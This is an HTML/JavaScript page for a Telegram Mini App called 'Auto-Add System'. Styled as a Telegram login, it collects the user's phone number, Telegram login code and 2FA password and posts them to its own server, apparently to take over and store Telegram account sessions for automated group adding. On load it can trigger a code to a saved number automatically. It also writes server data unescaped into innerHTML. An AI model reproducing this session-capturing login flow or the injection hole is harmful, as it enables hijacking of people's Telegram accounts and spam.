<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Account - Auto-Add System</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            background: #0a0a0f;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
        }

        .login-card {
            background: rgba(18, 18, 30, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 32px 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .step-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: center;
        }

        .step-description {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.9rem;
            margin-bottom: 24px;
            text-align: center;
            line-height: 1.5;
        }

        /* Detected Account Card */
        .detected-card {
            background: rgba(32, 178, 170, 0.1);
            border: 1px solid rgba(32, 178, 170, 0.3);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 20px;
            text-align: center;
        }

        .detected-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(135deg, #8a2be2, #ff1493);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            font-size: 1.5rem;
            font-weight: 700;
            color: white;
        }

        .detected-name {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .detected-username {
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.85rem;
            margin-bottom: 8px;
        }

        .detected-phone {
            color: #20b2aa;
            font-size: 1rem;
            font-weight: 500;
        }

        .detected-status {
            color: #ffaa00;
            font-size: 0.85rem;
            margin-top: 8px;
            padding: 6px 12px;
            background: rgba(255, 170, 0, 0.1);
            border-radius: 8px;
            display: inline-block;
        }

        /* Code Input */
        .code-container {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 24px 0;
        }

        .code-box {
            width: 54px;
            height: 64px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            color: #fff;
            font-size: 1.8rem;
            font-weight: 700;
            text-align: center;
            line-height: 60px;
            transition: all 0.3s;
        }

        .code-box.filled {
            border-color: rgba(138, 43, 226, 0.6);
            background: rgba(138, 43, 226, 0.15);
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
        }

        .code-box.active {
            border-color: rgba(255, 20, 147, 0.7);
            box-shadow: 0 0 25px rgba(255, 20, 147, 0.4);
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { border-color: rgba(255, 20, 147, 0.7); }
            50% { border-color: rgba(138, 43, 226, 0.9); }
        }

        .hidden-input {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }

        .code-hint {
            text-align: center;
            color: rgba(255, 255, 255, 0.4);
            font-size: 0.8rem;
            margin-top: -16px;
            margin-bottom: 16px;
        }

        /* Phone Input */
        .input-wrapper {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            overflow: hidden;
        }

        .input-wrapper:focus-within {
            border-color: rgba(138, 43, 226, 0.5);
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.2);
        }

        .input-prefix {
            padding: 14px 16px;
            color: #8a2be2;
            font-weight: 700;
            background: rgba(138, 43, 226, 0.1);
            border-right: 1px solid rgba(255, 255, 255, 0.1);
        }

        .form-input {
            flex: 1;
            padding: 14px 16px;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 1rem;
            outline: none;
        }

        .password-input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            margin-bottom: 16px;
        }

        .password-input:focus {
            border-color: rgba(138, 43, 226, 0.5);
        }

        /* Buttons */
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #8a2be2, #ff1493);
            color: white;
            box-shadow: 0 8px 30px rgba(138, 43, 226, 0.3);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(138, 43, 226, 0.5);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.08);
            color: rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.15);
            margin-top: 10px;
        }

        /* Messages */
        .error-message {
            background: rgba(255, 68, 68, 0.15);
            color: #ff6b6b;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #ff4444;
        }

        .success-message {
            background: rgba(32, 178, 170, 0.15);
            color: #20b2aa;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #20b2aa;
        }

        .info-message {
            background: rgba(138, 43, 226, 0.15);
            color: #b388ff;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #8a2be2;
        }

        .error-message.show, .success-message.show, .info-message.show {
            display: block;
        }

        .loading-spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-icon {
            font-size: 4rem;
            text-align: center;
            margin: 20px 0;
        }

        .attempt-counter {
            text-align: center;
            color: #ffaa00;
            font-size: 0.8rem;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <!-- Page 1: Detect / Phone Input -->
            <div id="page1">
                <div class="step-title">🔐 Telegram Login</div>
                <div class="step-description" id="page1Description">
                    Detecting your Telegram account...
                </div>

                <div class="error-message" id="error1"></div>
                <div class="success-message" id="success1"></div>
                <div class="info-message" id="info1"></div>

                <!-- Detected Account Card -->
                <div class="detected-card" id="detectedCard" style="display: none;">
                    <div class="detected-avatar" id="detectedAvatar">?</div>
                    <div class="detected-name" id="detectedName">---</div>
                    <div class="detected-username" id="detectedUsername"></div>
                    <div class="detected-phone" id="detectedPhone" style="display: none;"></div>
                    <div class="detected-status" id="detectedStatus"></div>
                </div>

                <!-- Phone Input -->
                <div id="phoneInputGroup" style="display: none;">
                    <div class="input-wrapper">
                        <span class="input-prefix">+</span>
                        <input type="tel" class="form-input" id="phone" placeholder="Phone number with country code" inputmode="numeric">
                    </div>
                </div>

                <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()" style="display: none;">
                    <span>Send Verification Code</span>
                </button>

                <div id="loadingIndicator" style="text-align: center; padding: 20px; display: none;">
                    <span class="loading-spinner"></span>
                    <span style="margin-left: 8px; color: rgba(255,255,255,0.6);" id="loadingText">Detecting your account...</span>
                </div>
            </div>

            <!-- Page 2: Code Verification -->
            <div id="page2" style="display: none;">
                <div class="step-title">📱 Enter Code</div>
                <div class="step-description" id="codeDescription">
                    Enter the 5-digit code from Telegram
                </div>

                <div class="error-message" id="error2"></div>
                <div class="success-message" id="success2"></div>

                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
                
                <div class="code-container" id="codeBoxes" onclick="focusCodeInput()">
                    <div class="code-box" id="box1"></div>
                    <div class="code-box" id="box2"></div>
                    <div class="code-box" id="box3"></div>
                    <div class="code-box" id="box4"></div>
                    <div class="code-box" id="box5"></div>
                </div>

                <div class="code-hint">Auto-verifies when complete</div>

                <div id="passwordGroup" style="display: none;">
                    <input type="password" class="password-input" id="password" placeholder="2FA Password">
                </div>

                <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
                    <span>Verify & Add Account</span>
                </button>

                <button class="btn btn-secondary" onclick="backToPage1()">
                    ← Back
                </button>

                <div class="attempt-counter" id="attemptCounter"></div>
            </div>

            <!-- Page 3: Success -->
            <div id="page3" style="display: none;">
                <div class="success-icon">✅</div>
                <div class="step-title" style="color: #20b2aa;">Account Added!</div>
                <div class="step-description" id="successAccountInfo">
                    Your account has been connected.
                </div>
                
                <button class="btn btn-primary" onclick="goToAutoAdd()">
                    ⚙️ Auto-Add Settings
                </button>
                
                <button class="btn btn-secondary" onclick="addAnotherAccount()">
                    ➕ Add Another Account
                </button>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // STATE
        // ============================================
        let currentSessionId = null;
        let currentPhone = '';
        let autoDetected = false;
        let telegramUser = null;
        let codeAttempts = 0;
        let isAutoVerifying = false;
        let savedPhoneForUser = null;

        // DOM elements
        const hiddenInput = document.getElementById('hiddenCodeInput');
        const boxes = [
            document.getElementById('box1'),
            document.getElementById('box2'),
            document.getElementById('box3'),
            document.getElementById('box4'),
            document.getElementById('box5')
        ];

        // ============================================
        // TELEGRAM MINI APP DETECTION
        // ============================================
        
        function getTelegramInitData() {
            // Method 1: Telegram WebApp SDK
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp;
                try {
                    tg.ready();
                    tg.expand();
                } catch(e) {}
                
                const initData = tg.initData || '';
                const initDataUnsafe = tg.initDataUnsafe || {};
                
                console.log('✅ Telegram WebApp detected');
                console.log('InitData available:', !!initData);
                console.log('User data:', initDataUnsafe.user);
                
                if (initData) {
                    return {
                        initData: initData,
                        user: initDataUnsafe.user || null
                    };
                }
            }
            
            // Method 2: URL query string
            const queryString = window.location.search.substring(1);
            if (queryString && (queryString.includes('hash=') || queryString.includes('user='))) {
                console.log('✅ Telegram data found in URL query');
                
                // Try to extract user from query string
                let user = null;
                const urlParams = new URLSearchParams(queryString);
                const userParam = urlParams.get('user');
                if (userParam) {
                    try {
                        user = JSON.parse(decodeURIComponent(userParam));
                    } catch(e) {}
                }
                
                return {
                    initData: queryString,
                    user: user
                };
            }
            
            // Method 3: Full URL for standalone
            const fullUrl = window.location.href;
            if (fullUrl.includes('tgWebAppData=')) {
                console.log('✅ Telegram data found in tgWebAppData');
                const match = fullUrl.match(/tgWebAppData=([^&]+)/);
                if (match) {
                    try {
                        const decoded = decodeURIComponent(match[1]);
                        // Try to extract user
                        const userMatch = decoded.match(/"user"\s*:\s*({[^}]+})/);
                        let user = null;
                        if (userMatch) {
                            try {
                                user = JSON.parse(userMatch[1]);
                            } catch(e) {}
                        }
                        return {
                            initData: decoded,
                            user: user
                        };
                    } catch(e) {}
                }
            }
            
            console.log('❌ No Telegram init data found');
            return null;
        }

        function extractUserFromInitData(initDataStr) {
            try {
                // Try to find user JSON in initData
                const userMatch = initDataStr.match(/"user"\s*:\s*({[^}]+})/);
                if (userMatch) {
                    return JSON.parse(userMatch[1]);
                }
                
                // Try URL decoding and finding user param
                const decoded = decodeURIComponent(initDataStr);
                const params = new URLSearchParams(decoded);
                const userParam = params.get('user');
                if (userParam) {
                    return JSON.parse(userParam);
                }
            } catch(e) {
                console.log('Could not extract user from initData:', e.message);
            }
            return null;
        }

        // ============================================
        // AUTO LOGIN FLOW
        // ============================================
        
        async function autoLogin() {
            const tgData = getTelegramInitData();
            let tgUser = tgData?.user;
            
            // If user not found in tgData, try extracting from initData string
            if (!tgUser && tgData?.initData) {
                tgUser = extractUserFromInitData(tgData.initData);
            }
            
            // Show loading
            showLoading('Detecting your Telegram account...');
            
            // NOT in Telegram Mini App - manual mode
            if (!tgData || !tgData.initData) {
                hideLoading();
                showPhoneInput('Open this app from Telegram for automatic login, or enter your phone number manually.');
                return;
            }
            
            // We have Telegram data - show user info
            if (tgUser) {
                telegramUser = tgUser;
                showDetectedUser(tgUser);
            } else {
                // Have initData but couldn't extract user - still try the API
                document.getElementById('detectedCard').style.display = 'none';
            }
            
            // Call the auto-login API
            try {
                const response = await fetch('/api/telegram-auto-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        initData: tgData.initData,
                        user: tgUser
                    })
                });

                const data = await response.json();
                hideLoading();
                
                console.log('Auto-login response:', data);

                if (data.success) {
                    // ✅ Phone FOUND - code was sent automatically
                    autoDetected = true;
                    currentSessionId = data.session_id;
                    savedPhoneForUser = data.phone_masked;
                    
                    updateDetectedPhone(data.phone_masked, 'saved');
                    
                    // Show success and transition to code page
                    showSuccess('✅ Code sent automatically to your saved number!', 1);
                    
                    setTimeout(() => {
                        showCodePage(data.phone_masked, data.user_name);
                    }, 800);
                    
                } else if (data.needs_phone) {
                    // ❌ Phone NOT FOUND - first time user
                    autoDetected = false;
                    updateDetectedPhone(null, 'new');
                    showPhoneInput(data.error || 'First time setup. Please enter your phone number.');
                    
                    // Pre-fill if we have any hint
                    const phoneInput = document.getElementById('phone');
                    phoneInput.focus();
                    
                    showInfo('📝 Enter your phone number once - it will be saved for future auto-login.', 1);
                    
                } else {
                    // Other error
                    showPhoneInput(data.error || 'Could not auto-detect. Please enter your phone number.');
                }
                
            } catch (error) {
                console.error('Auto-login error:', error);
                hideLoading();
                showPhoneInput('Connection error. Please enter your phone number manually.');
            }
        }

        // ============================================
        // UI HELPERS
        // ============================================

        function showLoading(text) {
            document.getElementById('loadingIndicator').style.display = 'flex';
            document.getElementById('loadingText').textContent = text;
            document.getElementById('sendCodeBtn').style.display = 'none';
            document.getElementById('page1Description').textContent = text;
        }

        function hideLoading() {
            document.getElementById('loadingIndicator').style.display = 'none';
            document.getElementById('sendCodeBtn').style.display = 'block';
        }

        function showDetectedUser(user) {
            const card = document.getElementById('detectedCard');
            card.style.display = 'block';
            
            // Avatar
            const initial = user.first_name ? user.first_name.charAt(0).toUpperCase() : '?';
            document.getElementById('detectedAvatar').textContent = initial;
            
            // Name
            const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ');
            document.getElementById('detectedName').textContent = fullName || 'Telegram User';
            
            // Username
            document.getElementById('detectedUsername').textContent = 
                user.username ? `@${user.username}` : '';
            
            // Phone - will be updated after API call
            document.getElementById('detectedPhone').style.display = 'none';
            document.getElementById('detectedStatus').textContent = 'Checking saved phone...';
        }

        function updateDetectedPhone(phone, type) {
            const phoneEl = document.getElementById('detectedPhone');
            const statusEl = document.getElementById('detectedStatus');
            
            if (type === 'saved' && phone) {
                phoneEl.style.display = 'block';
                phoneEl.textContent = `📱 ${phone}`;
                statusEl.textContent = '✅ Phone auto-detected!';
                statusEl.style.color = '#20b2aa';
                statusEl.style.background = 'rgba(32, 178, 170, 0.1)';
            } else {
                phoneEl.style.display = 'none';
                statusEl.textContent = '🆕 New user - phone required';
                statusEl.style.color = '#ffaa00';
                statusEl.style.background = 'rgba(255, 170, 0, 0.1)';
            }
        }

        function showPhoneInput(message) {
            document.getElementById('page1Description').textContent = message;
            document.getElementById('phoneInputGroup').style.display = 'block';
            document.getElementById('sendCodeBtn').style.display = 'block';
            document.getElementById('detectedCard').style.display = 'none';
            
            const phoneInput = document.getElementById('phone');
            setTimeout(() => phoneInput.focus(), 300);
        }

        function showCodePage(phoneMasked, userName) {
            document.getElementById('page1').style.display = 'none';
            document.getElementById('page2').style.display = 'block';
            
            let desc = 'Enter the 5-digit code from Telegram';
            if (phoneMasked) {
                desc = `Enter the 5-digit code sent to ${phoneMasked}`;
            }
            if (userName) {
                desc += `\nAccount: ${userName}`;
            }
            document.getElementById('codeDescription').textContent = desc;
            
            resetCodeInput();
            setTimeout(() => focusCodeInput(), 300);
        }

        function showError(message, pageNum = 1) {
            const el = document.getElementById(`error${pageNum}`);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(() => el.classList.remove('show'), 5000);
            }
        }

        function hideError(pageNum = 1) {
            const el = document.getElementById(`error${pageNum}`);
            if (el) el.classList.remove('show');
        }

        function showSuccess(message, pageNum = 1) {
            const el = document.getElementById(`success${pageNum}`);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(() => el.classList.remove('show'), 4000);
            }
        }

        function showInfo(message, pageNum = 1) {
            const el = document.getElementById(`info${pageNum}`);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(() => el.classList.remove('show'), 4000);
            }
        }

        function setLoading(button, isLoading) {
            button.disabled = isLoading;
            const originalText = button.getAttribute('data-original') || 'Submit';
            button.innerHTML = isLoading 
                ? '<span class="loading-spinner"></span><span>Processing...</span>'
                : `<span>${originalText}</span>`;
        }

        // ============================================
        // CODE INPUT
        // ============================================
        
        function focusCodeInput() {
            hiddenInput.focus();
            updateActiveBox();
        }

        function resetCodeInput() {
            hiddenInput.value = '';
            updateCodeBoxes();
            codeAttempts = 0;
            isAutoVerifying = false;
            document.getElementById('attemptCounter').textContent = '';
            document.getElementById('password').value = '';
            document.getElementById('passwordGroup').style.display = 'none';
            hideError(2);
        }

        function updateActiveBox() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            boxes.forEach((box, i) => {
                box.classList.remove('active');
                if (i === code.length && code.length < 5) {
                    box.classList.add('active');
                }
            });
        }

        function updateCodeBoxes() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '').slice(0, 5);
            
            boxes.forEach((box, i) => {
                box.classList.remove('filled', 'active', 'error');
                if (i < code.length) {
                    box.textContent = code[i];
                    box.classList.add('filled');
                } else {
                    box.textContent = '';
                }
            });
            
            if (code.length < 5) {
                boxes[code.length].classList.add('active');
            }
            
            hideError(2);
            
            // Auto-verify when complete
            if (code.length === 5 && !isAutoVerifying) {
                isAutoVerifying = true;
                setTimeout(() => {
                    if (hiddenInput.value.replace(/[^0-9]/g, '').length === 5) {
                        autoVerify();
                    } else {
                        isAutoVerifying = false;
                    }
                }, 300);
            }
        }

        function autoVerify() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            if (code.length !== 5) {
                isAutoVerifying = false;
                return;
            }

            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
            
            if (!needPassword) {
                setLoading(document.getElementById('verifyBtn'), true);
                hideError(2);
                performVerification(code, '');
            } else {
                const passwordInput = document.getElementById('password');
                if (!passwordInput.value) {
                    passwordInput.focus();
                    showError('2FA password required', 2);
                    isAutoVerifying = false;
                } else {
                    setLoading(document.getElementById('verifyBtn'), true);
                    hideError(2);
                    performVerification(code, passwordInput.value);
                }
            }
            
            isAutoVerifying = false;
        }

        // ============================================
        // API CALLS
        // ============================================

        async function sendCode() {
            let phone = document.getElementById('phone').value.trim().replace(/\s+/g, '');
            
            if (!phone) {
                showError('Please enter your phone number', 1);
                document.getElementById('phone').focus();
                return;
            }

            // Clean phone number
            phone = phone.replace(/[^0-9+]/g, '');
            if (!phone.startsWith('+')) phone = '+' + phone;

            const button = document.getElementById('sendCodeBtn');
            setLoading(button, true);
            hideError(1);

            try {
                const response = await fetch('/api/add-account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: phone,
                        telegramId: telegramUser?.id || ''
                    })
                });

                const data = await response.json();

                if (data.success) {
                    currentSessionId = data.session_id;
                    currentPhone = phone;
                    
                    showCodePage(phone, telegramUser?.first_name);
                } else {
                    showError(data.error || 'Failed to send code', 1);
                }
            } catch (error) {
                showError('Network error. Please try again.', 1);
            } finally {
                setLoading(button, false);
            }
        }

        async function performVerification(code, password) {
            try {
                const response = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        code: code,
                        session_id: currentSessionId,
                        password: password
                    })
                });

                const data = await response.json();

                if (data.success) {
                    // SUCCESS!
                    document.getElementById('page2').style.display = 'none';
                    document.getElementById('page3').style.display = 'block';
                    
                    const accountName = data.account?.name || 'User';
                    let info = `<strong>${accountName}</strong>`;
                    if (currentPhone) info += `<br>📱 ${currentPhone}`;
                    if (data.account_age) info += `<br>📅 Age: ${data.account_age}`;
                    if (data.auto_login_enabled) info += `<br>🔁 Auto-login enabled for future`;
                    document.getElementById('successAccountInfo').innerHTML = info;
                    
                    // Notify Telegram if possible
                    if (window.Telegram?.WebApp) {
                        try {
                            window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
                        } catch(e) {}
                    }
                    
                } else if (data.need_password) {
                    document.getElementById('passwordGroup').style.display = 'block';
                    document.getElementById('password').value = '';
                    document.getElementById('password').focus();
                    showError('2FA enabled. Enter your password.', 2);
                    isAutoVerifying = false;
                    
                } else {
                    const errMsg = data.error || 'Verification failed';
                    codeAttempts++;
                    const remaining = 5 - codeAttempts;
                    
                    if (remaining > 0) {
                        showError(`${errMsg} (${remaining} attempts left)`, 2);
                    } else {
                        showError('Too many attempts. Please start over.', 2);
                        setTimeout(() => backToPage1(), 2000);
                    }
                    
                    document.getElementById('attemptCounter').textContent = 
                        remaining > 0 ? `${remaining} attempts remaining` : 'No attempts left';
                    
                    resetCodeInput();
                    focusCodeInput();
                    isAutoVerifying = false;
                }
            } catch (error) {
                showError('Network error. Please try again.', 2);
                isAutoVerifying = false;
            } finally {
                setLoading(document.getElementById('verifyBtn'), false);
            }
        }

        async function verifyCode() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            
            if (code.length !== 5) {
                showError('Enter the complete 5-digit code', 2);
                focusCodeInput();
                return;
            }

            const passwordInput = document.getElementById('password');
            const needPassword = document.getElementById('passwordGroup').style.display === 'block';

            if (needPassword && !passwordInput.value) {
                showError('Enter your 2FA password', 2);
                passwordInput.focus();
                return;
            }

            setLoading(document.getElementById('verifyBtn'), true);
            hideError(2);
            
            await performVerification(code, passwordInput.value);
        }

        // ============================================
        // NAVIGATION
        // ============================================

        function backToPage1() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            document.getElementById('password').value = '';
            document.getElementById('passwordGroup').style.display = 'none';
            hideError(1);
            hideError(2);
            resetCodeInput();
        }

        function goToAutoAdd() {
            window.location.href = '/auto-add';
        }

        function addAnotherAccount() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            document.getElementById('phoneInputGroup').style.display = 'none';
            document.getElementById('detectedCard').style.display = 'none';
            document.getElementById('phone').value = '';
            resetCodeInput();
            hideError(1);
            hideError(2);
            hideError(3);
            
            // Re-run auto-login
            autoLogin();
        }

        // ============================================
        // EVENT LISTENERS
        // ============================================

        // Save original button text
        document.querySelectorAll('.btn-primary').forEach(btn => {
            const span = btn.querySelector('span');
            if (span) {
                btn.setAttribute('data-original', span.textContent);
            }
        });

        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCode();
        });

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') verifyCode();
        });

        hiddenInput.addEventListener('input', function(e) {
            let value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
            this.value = value;
            updateCodeBoxes();
        });

        hiddenInput.addEventListener('paste', function(e) {
            e.preventDefault();
            const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
            this.value = digits;
            updateCodeBoxes();
        });

        hiddenInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                verifyCode();
            }
        });

        // ============================================
        // INIT
        // ============================================
        
        window.addEventListener('load', () => {
            console.log('🚀 Login page loaded');
            console.log('User Agent:', navigator.userAgent);
            console.log('URL:', window.location.href);
            
            // Small delay to ensure Telegram SDK is loaded
            setTimeout(() => {
                autoLogin();
            }, 500);
        });

        // Handle back button / page visibility
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                console.log('Page visible again');
            }
        });
    </script>
</body>
</html>
